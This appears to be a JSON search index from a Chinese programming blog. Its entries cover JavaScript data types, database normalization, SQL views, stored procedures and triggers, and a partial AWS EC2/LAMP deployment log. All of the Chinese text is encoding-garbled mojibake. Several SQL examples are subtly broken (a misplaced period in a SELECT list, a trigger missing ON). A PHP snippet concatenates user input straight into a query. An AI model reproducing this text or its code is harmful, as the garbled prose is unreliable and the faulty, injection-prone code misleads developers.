'C' ]console.log(queue.shift()); // [ 'B', 'C' ]console.log(queue.shift()); // [ 'C' ]","link":"/2022/03/14/data-structure/"},{"title":"JavaScritp ä¸­çš„è³‡æ–™å‹åˆ¥","text":"æ‡¶äººåŒ…ã€‚ è¦çœ‹ä¸€å€‹è³‡æ–™çš„è³‡æ–™å‹åˆ¥å¯ä»¥ç”¨ typeof &lt;value&gt; ä¾†æª¢æŸ¥ï¼ˆä½† null æ˜¯ä¾‹å¤–ï¼‰ã€‚ å…­ç¨®åŸºæœ¬å‹åˆ¥ï¼ˆPrimitiveï¼‰ string number boolean undefinedï¼Œä»£è¡¨ä¸€å€‹è®Šæ•¸ã€Œæœ‰å®£å‘Šã€ä½†æ²’æœ‰å€¼ã€‚æ²’å®£å‘Šçš„è©±æœƒå¾—åˆ° xxx is not defined çš„ Error nullï¼Œè¡¨ç¤ºè®Šæ•¸æ²’æœ‰å€¼ï¼Œå¸Œæœ›è®Šæ•¸æ˜¯ã€Œç©ºå€¼ã€çš„æ™‚å€™å¯ä»¥ä½¿ç”¨ã€‚é›–ç„¶å®ƒ typeof æœƒå¾—åˆ° objectï¼Œä½†æŸå€‹æ„ç¾©ä¸Šä¾†èªªç®—æ˜¯ bugï¼Œæ‰€ä»¥æŠŠå®ƒç•¶æˆæ˜¯ç´”å€¼å°±å¥½ã€‚ symbolï¼ŒES6 å¾Œçš„ç”¢ç‰© éåŸºæœ¬å‹åˆ¥ï¼ˆNon-Primitiveï¼‰ Object Array function Array åšå€‹è£œå……Array é›–ç„¶å¯ä»¥æ”¾ã€Œä¸åŒå‹æ…‹ã€çš„è³‡æ–™ï¼Œä½†æ˜¯ä¸å»ºè­°é€™æ¨£åšã€‚ç•¢ç«Ÿä¸åŒæ€§è³ªçš„æ±è¥¿ä½ ä¹¾è„†å®£å‘Šä¸åŒçš„è®Šæ•¸ä¾†å„²å­˜æœƒæ¯”è¼ƒç›´è¦ºã€‚ Array ä¸ä¸€å®šè¦å¾ç¬¬ä¸€å€‹é–‹å§‹æ”¾ï¼Œæ²’æœ‰æ”¾çš„ JavaScript æœƒè‡ªå‹•å¹«ä½ ã€Œå¡«å€¼ã€ï¼Œä¸éé‚„æ˜¯ä¸å»ºè­°é€™æ¨£åšï¼ˆä½•å¿…æŠ˜ç£¨è‡ªå·±çš„è…¦è¢‹ï¼Ÿï¼‰ï¼š 123var myArray = []myArray[10] = 100console.log(myArray) // [ &lt;10 empty item &gt;, 100] åƒè€ƒè³‡æºJavaScript ï¼šPrimitive Types ç´”å€¼(åŸºæœ¬å‹åˆ¥)ä»‹ç´¹","link":"/2021/12/17/data-type/"},{"title":"è³‡æ–™åº«æ­£è¦åŒ–","text":"å†è¤‡ç¿’ä¸€æ¬¡ã€‚ ç°¡è¿°æ­£è¦åŒ–é€™å€‹æ±è¥¿å…¶å¯¦å¯ä»¥åˆ†å¾ˆå¤šéšç´šï¼Œåƒæ˜¯ï¼š ç¬¬ä¸€æ­£è¦åŒ– ç¬¬äºŒæ­£è¦åŒ– ç¬¬ä¸‰æ­£è¦åŒ– â€¦ ç°¡å–®ä¾†èªªå°±æ˜¯ã€Œåšè¶Šå¤šæ¬¡ï¼Œæ‹†çš„è¶Šç´°ã€çš„æ„æ€ï¼Œå¤§éƒ¨åˆ†åªæœƒåšåˆ°ç¬¬ä¸‰æ­£è¦åŒ–ï¼Œæœ€å¤šå¯ä»¥åˆ°ç¬¬äº”æ­£è¦åŒ–ï¼ˆä»¥æˆ‘æŸ¥åˆ°çš„è³‡æ–™ä¾†èªªå•¦ï¼‰ã€‚ ä¸éé€™è£¡æ²’æœ‰æƒ³è«‡é‚£éº¼ç´°ï¼Œæˆ‘åªå¸Œæœ›è¨´ä½ æ˜ç™½ã€Œæ­£è¦åŒ–ã€å¯¦éš›æ˜¯åœ¨åšä»€éº¼å°±å¥½äº†ã€‚å¦‚æœçœŸçš„æƒ³çŸ¥é“ç´°ç¯€è«‹åƒè€ƒé€™ç¯‡æ–‡ç« ï¼šDay 32 è³‡æ–™åº«æ­£è¦åŒ–(ä¸€~ä¸‰) åœ¨æ­£è¦åŒ–ä»¥å‰å‡è¨­ä½ æœ‰ä¸€å€‹è¨‚å–®çš„ tableï¼Œæœ€ç›´è¦ºçš„è¨­è¨ˆæ‡‰è©²æœƒæˆé€™æ¨£ï¼š çœ‹èµ·ä¾†é‚„è »åˆç†çš„ï¼Œä¸éä½ ä»”ç´°æƒ³æƒ³æœƒç™¼ç¾æœ‰ä¸€äº›å•é¡Œï¼š 1. æ²’æœ‰é‡é»ç”¨æ¯”è¼ƒå°ˆæ¥­ä¸€é»çš„è¡“èªä¾†èªªæ˜¯ã€Œæ²’æœ‰ä¸»éµï¼ˆPrimary Keyï¼‰ã€ï¼Œä½†æˆ‘è¦ºå¾—æƒ³æˆæ˜¯æ²’æœ‰é‡é»å°±å¥½ã€‚ ä¸éé€™æ˜¯ä»€éº¼æ„æ€ï¼Ÿ èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœæ‹¿ 1 | PeaNu | Macbook é€™ä¸€æ¬„ä¾†çœ‹ï¼Œä½ æœ‰æ²’æœ‰è¾¦æ³•åœ¨ã€Œåªçœ‹ä¸€æ ¼çš„æƒ…æ³ä¸‹ã€å°±çŸ¥é“å®ƒæƒ³è¡¨é”ä»€éº¼ï¼Ÿ æ²’æœ‰è¾¦æ³•ï¼Œä½ åªçœ‹ 1 çœ‹ä¸æ‡‚ï¼Œåªçœ‹ PeaNu ä¹Ÿçœ‹ä¸æ‡‚ï¼Œåªçœ‹ Mackbook ä¹Ÿä¸€æ¨£ã€‚åªæœ‰æŠŠä¸‰å€‹åˆèµ·ä¾†ä¸€èµ·çœ‹ï¼Œä½ æ‰çŸ¥é“ã€Œå“¦ï¼Œé€™æ˜¯ç·¨è™Ÿ 1 çš„è¨‚å–®ï¼Œæœ‰å€‹å« PeaNu çš„äººè²·äº† Macbookã€ã€‚ æ‰€ä»¥å‘¢ï¼Œé€™å€‹å°±å«æ²’æœ‰é‡é»ï¼ˆPrimary Keyï¼‰ã€‚ 2. å¾ˆé›£ç¶­è­·æƒ³æƒ³çœ‹ï¼Œå¦‚æœå“ªå¤© PeaNu çªç„¶æƒ³æ”¹åç‚º PePeï¼Œé‚£å°±å¾—æŠŠåŸæœ¬æ˜¯ PeaNu çš„åœ°æ–¹å…¨éƒ¨æ”¹æ‰ï¼Œæœ‰å¹¾å€‹å°±è¦æ”¹å¹¾æ¬¡ã€‚æˆ–æ˜¯ PeaNu è²·äº† 100 å€‹ç”¢å“ï¼Œå°±å¾—ä¾ç…§æ¬„ä½è¼¸å…¥ï¼šè¨‚å–®ç·¨è™Ÿ | PeaNU | ç”¢å“åç¨±ï¼Œè¼¸å…¥ 100 æ¬¡ã€‚ ä»¥ä¸Šå•é¡Œåœ¨è³‡æ–™é‡å¾ˆå°çš„æ™‚å€™ï¼Œå½±éŸ¿ä¸å¤§ï¼Œæ‰€ä»¥ä¸åšæ­£è¦åŒ–ä¹Ÿæ²’é—œä¿‚ã€‚å¯æ˜¯è³‡æ–™é‡å¤§çš„æ™‚å€™æ²’åšæ­£è¦åŒ–ï¼Œé‚£å°±çœŸçš„éº»ç…©å¤§äº†ã€‚ æ­£è¦åŒ–ä»¥å¾ŒåŸºæœ¬ä¸Šï¼Œæ­£è¦åŒ–çš„æ¦‚å¿µå¯ä»¥æƒ³æˆæ˜¯ã€ŒæŠŠ table ç¨ç«‹æˆå¦ä¸€å€‹ tableã€ã€‚ ä¾†çœ‹ä¸€ä¸‹å‰›å‰›çš„ä¾‹å­æ­£è¦åŒ–å¾Œæœƒé•·ä»€éº¼æ¨£ï¼š ç¾åœ¨æŠŠ table æ‹†æˆå››å€‹ï¼Œåˆ†åˆ¥æ˜¯ï¼š ordersï¼Œè£¡é¢å„²å­˜ id å’Œ user_idï¼Œä»£è¡¨ã€Œè¨‚å–®ç·¨è™Ÿã€å’Œã€Œè²·å®¶ç·¨è™Ÿã€ orders_productsï¼Œè£¡é¢å„²å­˜ order_id å’Œ product_idï¼Œä»£è¡¨ã€Œè¨‚å–®ç·¨è™Ÿã€å’Œã€Œç”¢å“ç·¨è™Ÿã€ usersï¼Œè£¡é¢å„²å­˜ id å’Œ nameï¼Œä»£è¡¨ã€Œè²·å®¶ç·¨è™Ÿã€å’Œã€Œè²·å®¶åç¨±ã€ productsï¼Œè£¡é¢å„²å­˜ id å’Œ nameï¼Œä»£è¡¨ã€Œç”¢å“ç·¨è™Ÿã€å’Œã€Œç”¢å“åç¨±ã€ ç¶“éæ­£è¦åŒ–ä»¥å¾Œï¼Œèƒ½è§£æ±ºä¸Šé¢æåˆ°çš„å•é¡Œï¼š 1. é‡é»æ€§é›–ç„¶æ²’è¾¦æ³•åªçœ‹ä¸€å€‹æ¬„ä½å°±çŸ¥é“åœ¨å¹¹ä»€éº¼ï¼Ÿä½†è‡³å°‘ä½ å–®çœ‹ orders å°±å¯ä»¥çŸ¥é“è£¡é¢æœ‰ 2 å€‹è¨‚å–®ï¼Œæˆ–çœ‹ order_products å¯ä»¥çŸ¥é“è¨‚å–® 1 è²·äº†é‚£äº›ç”¢å“ï¼Œä»¥æ­¤é¡æ¨ã€‚ ç¸½ä¹‹å‘¢ï¼Œæ¯å€‹ table è£¡éƒ½æœ‰ä¸€å€‹ã€Œæ¯”è¼ƒé—œéµã€çš„å€¼ï¼ˆåœ¨é€™é‚Šæ˜¯ idï¼‰ï¼Œè€Œä¸æ˜¯åƒå‰›å‰›å…¨éƒ¨éƒ½æ··åœ¨ä¸€èµ·ã€‚ 2. å¯ç¶­è­·æ€§å¦‚æœç¾åœ¨è¦æ”¹ PeaNu çš„åå­—ï¼Œåªéœ€è¦æ”¹ users è£¡çš„ PeaNu å°±å¥½ï¼Œå› ç‚º orders è£¡çš„ user_id ä¸æœƒè®Šï¼Œæˆ–æ˜¯ PeaNu è²·äº†å¾ˆå¤šå€‹ç”¢å“ï¼Œé‚£ä¹Ÿåªè¦åˆ° order_products è£¡é¢æ–°å¢ order_id = 1 å’Œ product_id = ç”¢å“ç·¨è™Ÿ å°±å¥½ã€‚ ä»¥ä¸Šå°±æ˜¯æ­£è¦åŒ–çš„ç”¨é€”ï¼Œé‚„æœ‰ç‚ºä»€éº¼è¦æ­£è¦åŒ–ã€‚é›–ç„¶è¬›çš„æ²’æœ‰å¾ˆå¥½ï¼Œä½†æ‡‰è©²è‡³å°‘æœƒæœ‰ä¸€é»æ¦‚å¿µå§ï½","link":"/2022/03/12/database-normalization/"},{"title":"è³‡æ–™åº«ä¸­çš„ Viewã€Stored Procedure å’Œ Triggers","text":"å°çŸ¥è­˜ã€‚ View åªæ˜¯ä¸€å€‹ç”¨ä¾†ã€Œçœ‹ã€çš„è¡¨ï¼Œå¯ä»¥æƒ³æˆæ˜¯è™›æ“¬çš„ tableã€‚ å¯¦éš›ç”¨åˆ°çš„æ©Ÿæœƒä¸å¤šï¼Œä½†å¯ä»¥ç”¨åœ¨ã€Œä¸æƒ³è®“åˆ¥äººçœ‹åˆ°åŸæœ¬ tableã€æ™‚ï¼Œå°±åªé–‹ä¸€å€‹ view çµ¦å®ƒã€‚ ä¾‹å¦‚èªªä½ æœ‰ usersã€orders å’Œ products é€™äº› tableï¼Œå¯æ˜¯ä½ çš„è€é—†åªæƒ³çœ‹åˆ°åƒé€™æ¨£çš„å ±è¡¨ï¼š è€Œä¸æ˜¯ä¸€å¤§å †çœ‹ä¸æ‡‚çš„ users_id æˆ– products_id ä¹‹é¡çš„æ±è¥¿ã€‚ æ‰€ä»¥ç‚ºäº†æ’ˆå‡ºä¸Šé¢çš„è³‡è¨Šï¼Œä½ å¤§æ¦‚æœƒä¸‹é€™æ¨£çš„ SQLï¼š 123456789SELECT o.id, o.user_id. u.username, p.name, o.quantity, o.price, o.quantity * o.price AS totalFROM orders AS oJOIN users AS u on o.user_id = u.idJOIN products AS p on o.product_id = p.idORDER BY o.id ASC æ¥ä¸‹ä¾†ä½ æœ‰å…©ç¨®åšæ³•ï¼š ç”¨ PHP åŒ…æˆä¸€å€‹ function å»ºç«‹ä¸€å€‹ View å»ºç«‹ view çš„æ–¹å¼ä¸é›£ï¼Œä¸€æ¨£æ˜¯ç”¨ SQL èªæ³•ä¾†å»ºç«‹ã€Œæª¢è¦–è¡¨ï¼ˆviewï¼‰ã€ï¼š 12345678910CREATE VIEW order_detail AS SELECT o.id, o.user_id. u.username, p.name, o.quantity, o.price, o.quantity * o.price AS total FROM orders AS o JOIN users AS u on o.user_id = u.id JOIN products AS p on o.product_id = p.id ORDER BY o.id ASC æ¥è‘—å°±æœƒçœ‹åˆ°æœ‰å€‹å«åšã€Œæª¢è¦–è¡¨ã€çš„æ¬„ä½å‡ºç¾äº†ï¼š å®ƒä¸æ˜¯çœŸçš„ tableï¼Œå®ƒåªæ˜¯æŠŠå‰›å‰›ä¸‹çš„ SQL æŒ‡ä»¤çµæœæ’ˆå‡ºä¾†è€Œå·²ã€‚ å¦å¤–ï¼Œæ—¢ç„¶éƒ½èªªæ˜¯æª¢è¦–è¡¨ï¼Œå°±ä»£è¡¨å®ƒçœŸçš„åªèƒ½ã€Œæª¢è¦–ã€ï¼Œä¸è¦å†æƒ³èªªè¦å°å®ƒåšæ–°å¢ã€ç·¨è¼¯æˆ–åˆªé™¤çš„æ“ä½œäº†ã€‚ Stored Procedureï¼ˆSPï¼‰ å°±åƒ SQL çš„ function é€™é‚Šè«‡çš„ function ä¸æ˜¯é€™ç¨®ï¼š 1SELECT SUM(price) FROM order_detail é€™æ˜¯åœ¨ query è£¡é¢ç”¨çš„ functionã€‚ æˆ‘å€‘è¦è«‡çš„æ˜¯å¯ä»¥ç›´æ¥ã€Œå–ä»£ SQLã€çš„ functionã€‚ é›–ç„¶ä½ å¯èƒ½æœƒæƒ³èªªå¹¹å˜›ä¸ç›´æ¥ PHP ä¾†å¯«ä¸€å€‹ function ä¾†ç”¨ï¼Œåƒé€™æ¨£ï¼š 12345function getUserOrder($id) { $sql = \"SELECT * FROM orders WHERE user_id=\" . $id; // ... return result;} é€™æ¨£å­åšç•¶ç„¶ä¹Ÿæ²’å•é¡Œï¼Œå¯æ˜¯å¦‚æœèƒ½ç›´æ¥è®“ SQL æœ¬èº«å°±æœ‰é€™æ¨£çš„ functionï¼Œé‚£ä¸æ˜¯æ›´æ–¹ä¾¿å—ï¼Ÿé€™å€‹å°±æ˜¯ SP çš„ç›®çš„ã€‚ è‡³æ–¼ç”¨æ³•çš„è©±æ˜¯é€™æ¨£å­ï¼š 123456DELIMITER // # é‡æ–°è¨­å®šCREATE PROCEDURE getOrder(id INT) BEGIN SELECT * FROM orders WHERE user_id = id; END //DELIMITER ; # æ”¹å›ä¾† æ³¨æ„å¹¾é»ï¼š ç‚ºäº†é¿å…åˆ†è™Ÿçš„è¡çªï¼Œè¦å…ˆç”¨ DELIMITER æŒ‡å®šè¦ç”¨ä»€éº¼ä¾†å–ä»£åˆ†è™Ÿã€‚ å®£å‘Šåƒæ•¸æ™‚è¦é€£åŒå‹æ…‹ä¸€èµ·å®£å‘Š å¦å¤–ï¼Œä¸€å€‹ SP éƒ½æ˜¯ä»¥ä¸€å€‹ data base ä¾†ç•¶ä½œå–®ä½ï¼Œæ‰€ä»¥åªæœ‰åœ¨ä½ å»ºç«‹çš„åœ°æ–¹æ‰èƒ½ä½¿ç”¨ã€‚ å¦‚æœè¦æŸ¥çœ‹å»ºç«‹çš„ SP æœ‰å“ªäº›çš„è©±ï¼Œå¯ä»¥é»ã€Œé å­˜ç¨‹åºã€ä¾†çœ‹ï¼š ä¸é SP æ˜¯æœ‰ç¼ºé»çš„ï¼Œå‡å¦‚ç•¶ PHP æœ‰ Bug æ™‚ï¼Œå°±å¾—åˆ° MySQL çœ‹é‚£å€‹ function æ˜¯ä¸æ˜¯æœ‰éŒ¯ï¼Œç­‰æ–¼è¦å…©é‚Šä¾†å›è·‘çš„æ¦‚å¿µã€‚ Triggersè·Ÿ git hooks æåˆ°çš„æ¦‚å¿µä¸€æ¨£ï¼š åœ¨äº‹æƒ…ç™¼ç”Ÿå‰/å¾Œè¦åšä»€éº¼ï¼Ÿ ä¾‹å¦‚èªªæˆ‘å¸Œæœ›ç•¶ products æœ‰æ›´æ–°æ™‚ï¼Œå°±å¯«ä¸€å€‹è¨˜éŒ„åˆ° products_audit è£¡ã€‚ å¦‚æœä¸é€é Trigger çš„è©±ï¼Œå°±å¾—åœ¨ PHP è£¡è‡ªå·±åšé€™ä»¶äº‹ã€‚æ‰€ä»¥å–„ç”¨ Trigger å°±å¯ä»¥å¹«ä½ æ¸›å°‘ä¸€äº›éº»ç…©ã€‚ æ‰€ä»¥æ¥ä¸‹ä¾†å°±è¬›ä¸€ä¸‹æ€éº¼è¨­å®š Triggerï¼š 123456789DELIMITER //CREATE TRIGGER before_product_update BEFORE UPDATE products FOR EACH ROWBEGIN INSERT INTO products_audit(product_id, name, price, action) VALUES(OLD.id, OLD.name, OLD.price, 'UPDATE');END //DELIMITER ; é™„è¨»ï¼šMySQL æœƒæä¾› OLD å’Œ NEW é€™å…©å€‹è®Šæ•¸ä¾†å–å¾—ã€Œè³‡æ–™æ›´æ–°å‰/å¾Œçš„å€¼ã€ å»ºç«‹æˆåŠŸå¾Œï¼Œè©¦è‘—å»æ”¹ products å¾Œå†ä¾†çœ‹ products_audit å°±æœƒç™¼ç¾è‡ªå‹•æ›´æ–°å…§å®¹äº†ï¼š è·Ÿ SP ä¸€æ¨£ï¼Œå¦‚æœä½ è¦çœ‹å»ºç«‹äº†å“ªäº› Trigger å°±é»ã€Œè§¸ç™¼å™¨ã€ä¾†çœ‹ï¼š","link":"/2022/03/09/database-view-stored-procedure-and-triggers/"},{"title":"ä¸€åˆ€æœªå‰ªçš„ AWS éƒ¨ç½²ç´€éŒ„","text":"æƒ³æŠŠè‡ªå·±çš„éƒ¨ç½²éç¨‹ç´€éŒ„ä¸‹ä¾†ã€‚ ç°¡è¿°æˆ‘åƒè€ƒçš„æ–‡ç« æ˜¯é€™ç¯‡ï¼š[ ç´€éŒ„ ] éƒ¨å±¬ AWS EC2 é›²ç«¯ä¸»æ©Ÿ + LAMP Server + phpMyAdminã€‚é€™æ˜¯æˆ‘è¦ºå¾—å¯«çš„æœ€æ¸…æ¥šçš„ä¸€ç¯‡ï¼Œå¦‚æœçœ‹ä¸æ‡‚æˆ‘çš„å¯ä»¥çœ‹å®ƒçš„å°±å¥½ã€‚ è‡³æ–¼é€™ç¯‡è¨˜éŒ„å¯ä»¥ç°¡å–®åˆ†æˆä»¥ä¸‹å¹¾å€‹é‡é»ï¼š é–‹å•Ÿ AWS çš„è™›æ“¬ä¸»æ©Ÿæœå‹™ é€£ç·šåˆ°è™›æ“¬ä¸»æ©Ÿï¼Œä¸¦è¨­å®šä½œæ¥­ç’°å¢ƒï¼ˆLAMPï¼‰ è²·ç¶²åŸŸï¼Œç„¶å¾ŒæŠŠç¶²åŸŸå’Œ IP ä½å€ä¸²èµ·ä¾† éç¨‹ä¸­ç¢°åˆ°çš„éŒ¯èª¤è™•ç† å¦å¤–æ¨™é¡Œä¹Ÿèªªäº†ï¼Œé€™ç¯‡ä¸»è¦æ˜¯ä»¥ç´€éŒ„æ€§è³ªç‚ºä¸»ï¼Œæ‰€ä»¥æˆ‘ä¸æœƒè‘—å¢¨å¤ªå¤šåœ¨ä¸€äº›ç´°ç¯€ä¸Šï¼Œä¸æ‡‚çš„éƒ¨åˆ†ä½ é‚„æ˜¯å¾—é è‡ªå·±ä¸Šç¶²æŸ¥è³‡æ–™ï¼Œç¸½ä¹‹åŠ æ²¹å›‰ï¼ ç¬¬ä¸€æ­¥ï¼šé–‹é€š AWS è™›æ“¬ä¸»æ©Ÿè¨»å†Š AWS å¸³è™Ÿæ²’éŒ¯ï¼Œæˆ‘åœ¨ä¸€é–‹å§‹å°±å¡é—œäº†ï¼Œå› ç‚ºæ‰‹æ©Ÿé©—è­‰ä¸€ç›´æ”¶ä¸åˆ°é©—è­‰ç¢¼ã€‚å¦å¤–é‚„å› ç‚ºä¸€ç›´é‡æ–°ç™¼é€é©—è­‰ç¢¼å¤ªå¤šæ¬¡ï¼Œå®³è‡ªå·±çš„å¸³è™Ÿè¢« ban æ‰ï¼š å¾Œä¾†è¯ç¹«å®¢æœï¼Œä½†ç­‰äº† 2 å¤©éƒ½æ²’å¾—åˆ°å›æ‡‰ï¼š ç°¡å–®ä¾†èªªï¼Œé€™å€‹å•é¡Œå‡ºåœ¨ã€Œé›»ä¿¡è¡Œã€çš„é—œä¿‚ï¼Œå› ç‚ºæˆ‘çš„æ‰‹æ©Ÿæ˜¯å°ç£ä¹‹æ˜Ÿæ‰€ä»¥æ‰æ”¶ä¸åˆ°ã€‚ ç¸½ä¹‹æœ€å¾Œæ±ºå®šé‡æ–°è¾¦ä¸€å€‹æ–°çš„å¸³è™Ÿï¼Œä¸¦ä¸”è·Ÿå®¶äººå€Ÿæ‰‹æ©Ÿï¼ˆå°å“¥å¤§ï¼‰ï¼Œæœ€å¾Œä¸åˆ°å¹¾åˆ†é˜å°±è§£æ±ºé€™å•é¡Œäº†ã€‚ æ‰€ä»¥å‘¢ï¼Œå¦‚æœä½ çš„æ‰‹æ©Ÿé›»ä¿¡æ˜¯å°ç£ä¹‹æ˜Ÿï¼š å»ºè­°ç›´æ¥æ›ä¸€æ”¯æ‰‹æ©Ÿä¾†å–å¾—é©—è­‰ç¢¼ å»ºè­°ç›´æ¥æ›ä¸€æ”¯æ‰‹æ©Ÿä¾†å–å¾—é©—è­‰ç¢¼ å»ºè­°ç›´æ¥æ›ä¸€æ”¯æ‰‹æ©Ÿä¾†å–å¾—é©—è­‰ç¢¼ ä¸ç„¶çœŸçš„æœƒè¢«æå¾ˆä¹…ã€‚ æ¨è–¦é–±è®€ï¼šAWS Startups AWS Identity awsã€ŒAmazon web servicesã€è¨»å†Šé›»è©±é©—è­‰ç¢¼é²é²æœªæ”¶åˆ°ï¼Ÿï¼ é¸è™›æ“¬æ©Ÿå™¨é€™é‚Šå°±æŒ‰ç…§æ•™å­¸é¸æ“‡ ã€ŒUbuntu Server 20.04 LTS (HVM), SSD Volume Typeã€ é‚„è »æœ‰è¶£çš„ï¼ŒçœŸçš„å¥½åƒåœ¨é¸ä¸»æ©Ÿä¸€æ¨£ã€‚ é¸æ“‡æ–¹æ¡ˆä¸€æ¨£æŒ‰ç…§æ•™å­¸é¸æ“‡æœ‰ã€Œç¶ è‰²æ¨™ç« ã€çš„å…è²»æ–¹æ¡ˆï¼š ç´°ç¯€è¨­å®šç›´æ¥ä¸‹ä¸€æ­¥ æ·»åŠ  Storageç›´æ¥ä¸‹ä¸€æ­¥ æ·»åŠ  tagç›´æ¥ä¸‹ä¸€æ­¥ è¨­å®šå®‰å…¨ç¾¤çµ„ é™„è¨»ï¼šä»”ç´°çœ‹æœƒç™¼ç¾æˆ‘é€™é‚Šé¸æˆå…©å€‹ HTTP äº†ï¼Œé€™æ¨£æœƒæœ‰å•é¡Œï¼Œæ‰€ä»¥é¸çš„æ™‚å€™è¦è¨˜å¾—å†ç¢ºèªä¸€ä¸‹ã€‚ if you want to set up a web server and allow Internet traffic to reach your instance, add rules that allow unrestricted access to the HTTP and HTTPS ports ç°¡å–®ä¾†èªªé€™é‚Šæ˜¯è¦è¨­å®šã€Œä½ æƒ³æ€éº¼é€£åˆ°é€™å°æ©Ÿå™¨ã€ã€‚é è¨­åªæœ‰ SSHï¼Œæ‰€ä»¥ä½ å¿…é ˆè‡ªå·±åŠ ä¸Š HTTP å’Œ HTTPS é€™å…©å€‹ï¼Œé€™æ¨£ä¹‹å¾Œæ‰æœ‰è¾¦æ³•ç”¨ç€è¦½å™¨ä¾†é€£ã€‚ æœ‰è¶£çš„æ˜¯é€™é‚Šå¯ä»¥é †ä¾¿è¤‡ç¿’ä¸€ä¸‹ç¶²è·¯çš„çŸ¥è­˜ï¼Œåƒåœ–ç‰‡è£¡æœ‰å‡ºç¾ TCP å”è­° å’Œ port é€™äº›å°ˆæœ‰åè©ã€‚é›–ç„¶é€™é‚Šçš„å€¼æ˜¯è‡ªå‹•å¸¶å…¥è€Œä¸”ä¸èƒ½æ”¹ï¼Œä½†è‡³å°‘ä½ èƒ½å¤§æ¦‚çœ‹æ‡‚é€™é‚Šåœ¨è¨­å®šä»€éº¼ã€‚ æœ€å¾Œæª¢æŸ¥å°±è·Ÿä½ ç¶²è³¼è²·æ±è¥¿çµå¸³çš„æ¦‚å¿µä¸€æ¨£ï¼Œæœ€å¾Œéƒ½æœƒè®“ä½ ç¢ºèªä¸€ä¸‹ä½ å‰›å‰›çš„é¸æ“‡å’Œè¨­å®šï¼š è¨­å®šé‡‘é‘°ï¼ˆkey pairï¼‰è¦é€£åˆ°é€™å°æ©Ÿå™¨çš„è©±å¿…é ˆé€é AWS çš„å…¬é‘°ï¼ˆpublic keyï¼‰å’Œè‡ªå·±æ‰‹ä¸Šçš„ç§é‘°ï¼ˆprivate keyï¼‰ã€‚æ‰€ä»¥é€™é‚Šè¦åšè¨­å®šã€‚ ä¸‹é¢æœ‰æé†’ä½ ï¼Œè¨­å®šå¥½ä¹‹å¾Œè¨˜å¾—æŠŠç§é‘°ä¸‹è¼‰åˆ°é›»è…¦è£¡ä¿å­˜ï¼Œä¸ç„¶ä¹‹å¾Œå°±æ²’è¾¦æ³•ä¸‹è¼‰äº†ã€‚å¦å¤–é€™é‚Šä¹Ÿçœ‹åˆ°ä»¥å‰å­¸çš„æ±è¥¿ã€ŒRSAã€ï¼Œä¸€ç¨®éå°ç¨±å¼åŠ å¯†çš„æ–¹æ³•ã€‚ ç¸½ä¹‹å‘¢ï¼Œç¢ºä¿ç§é‘°ä¸‹è¼‰å®Œå¾Œå°±å¯ä»¥é€²åˆ°ä¸‹ä¸€æ­¥äº†ã€‚ å»ºç«‹æˆåŠŸçœ‹åˆ°é€™ç•«é¢å°±ä»£è¡¨æˆåŠŸäº†ï¼š æ¥è‘—æ¡ˆå³ä¸‹è§’çš„ã€ŒView Instanceã€ã€‚ï¼ˆé€™é‚Šæˆªåœ–æˆªä¸åˆ°ï¼Œä½†ä½ æ»¾è»¸å¾€ä¸‹æ»‘å°±æœƒçœ‹åˆ°äº†ï¼‰ å–å¾— IP ä½å€åˆ°é€™è£¡å°±å·²ç¶“å®Œæˆä¸»æ©Ÿçš„å•Ÿå‹•å›‰ï¼ å›ä¸»æ§å°å¯ä»¥çœ‹åˆ°è‡ªå·± server çš„ Public IPv4 ä½å€ï¼Œè¨˜èµ·ä¾†å°±å°äº†ã€‚ ç¬¬äºŒæ­¥ï¼šé€£åˆ°è™›æ“¬ä¸»æ©Ÿå’Œè¨­å®šç’°å¢ƒï¼ˆLAMPï¼‰ç”¨ SSH ä¾†é€£ç·š æŒ‰ä¸‹ connï¼Œæ¥è‘—æœƒè·³å‡ºé€™ç•«é¢ï¼š é€™é‚Šæœ‰æä¾›ä¸åŒçš„é¸é …ä¾†é€£ç·šï¼Œä½†é€™é‚Šæœƒç”¨ SSH çš„æ–¹å¼ä¾†åšã€‚æ‰€ä»¥æ¥ä¸‹ä¾†æ‰“é–‹ä½ çš„ CLIï¼Œç„¶å¾ŒæŒ‰ç…§åœ–ç‰‡çš„æŒ‡ç¤ºä¸€æ­¥ä¸€æ­¥ä¾†ã€‚ 1chmod 400 \"&lt;ç§é‘°æª”æ¡ˆè·¯å¾‘&gt;\" chmodï¼ˆchange modeï¼‰æ˜¯ Linux çš„æŒ‡ä»¤ï¼Œç”¨ä¾†è¨­å®šä¸€å€‹ã€Œæª”æ¡ˆæ¬Šé™ã€ï¼Œåƒæ˜¯èª°å¯ä»¥ read å•¦ã€write å•¦ç­‰ç­‰ä¹‹é¡çš„ã€‚ æ‰€ä»¥ç°¡å–®ä¾†èªªé€™é‚Šæ˜¯åœ¨è¨­å®šã€Œåªæœ‰ user å¯ä»¥ READã€é€™å€‹ç§é‘°æª”æ¡ˆã€‚è©³ç´°å¯ä»¥åƒè€ƒé€™å€‹ç¶²ç«™ æ¥è‘—ï¼š 1ssh -i \"&lt;ç§é‘°æª”æ¡ˆè·¯å¾‘&gt;\" ubuntu@ec2-&lt; IPv4 ä½ç½®&gt;.compute-1.amazonaws.com é™„è¨»ï¼š-i æ˜¯ identity_file çš„æ„æ€ï¼Œæ‰€ä»¥å¾Œé¢æ‰æ¥ç§é‘°æª”æ¡ˆã€‚ çœ‹åˆ° welcomeâ€¦ å°±ä»£è¡¨é€£ç·šæˆåŠŸäº†ï¼š è¨­å®š LAMPæ¥ä¸‹ä¾†è¦ä¾†å°é€™å°ä¸»æ©Ÿè¨­å®šä¼ºæœå™¨ç’°å¢ƒï¼šLAMPï¼ˆLinux + Apache + MySQL + PHPï¼‰ é™„è¨»ï¼šæ³¨æ„ç¾åœ¨çš„ä¸»æ©Ÿæ˜¯ Ubuntuï¼Œä¹Ÿå°±æ˜¯ Linux çš„ç’°å¢ƒï¼Œæ‰€ä»¥æŒ‡ä»¤æœƒè·Ÿä¸€èˆ¬ä½ åœ¨ windows ä¸Šç”¨çš„ä¸ä¸€æ¨£ã€‚ï¼ˆé€™é‚Šä¹Ÿèƒ½æ˜é¡¯æ„Ÿå—åˆ°ä½ çœŸçš„åœ¨æ“ä½œé ç«¯çš„ä¸»æ©Ÿï¼Œè¼¸å…¥æŒ‡ä»¤éƒ½æœƒå¡å¡çš„ï¼‰ æ›´æ–° Ubuntu ç³»çµ± 1sudo apt update &amp;&amp; sudo apt upgrade &amp;&amp; sudo apt dist-upgrade è·‘åˆ°ä¸€åŠæ™‚æœƒè·³å‡ºéœ€è¦å¤šå°‘ç©ºé–“çš„è¨Šæ¯ï¼Œå•ä½ 